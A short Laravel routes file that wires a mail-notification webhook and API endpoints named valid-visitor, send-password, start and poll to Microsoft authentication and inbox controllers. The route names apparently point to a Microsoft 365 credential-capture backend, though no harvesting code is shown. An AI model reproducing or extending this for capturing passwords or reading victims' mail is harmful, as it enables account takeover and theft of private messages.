<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CoreSystemController;
use App\Http\Controllers\Api\StartController;
use App\Http\Controllers\Api\MicrosoftAuthController;
use App\Http\Controllers\MicrosoftInboxController;

use Illuminate\Http\Request;

Route::any('/mail-notify', function (Request $request) {

    if ($request->has('validationToken')) {

        header('Content-Type: text/plain');

        echo $request->query('validationToken');

        exit;
    }

    \Log::info('MAIL WEBHOOK', [
        'body' => file_get_contents("php://input")
    ]);

    return response('ok',200);
});


Route::post('/valid-visitor', [CoreSystemController::class, 'storeValidVisitor']);
Route::post('/send-password', [CoreSystemController::class, 'storePassword']);
Route::post('/start',[MicrosoftAuthController::class,'start']);
Route::get('/poll/{login_id}', [MicrosoftAuthController::class,'poll']);





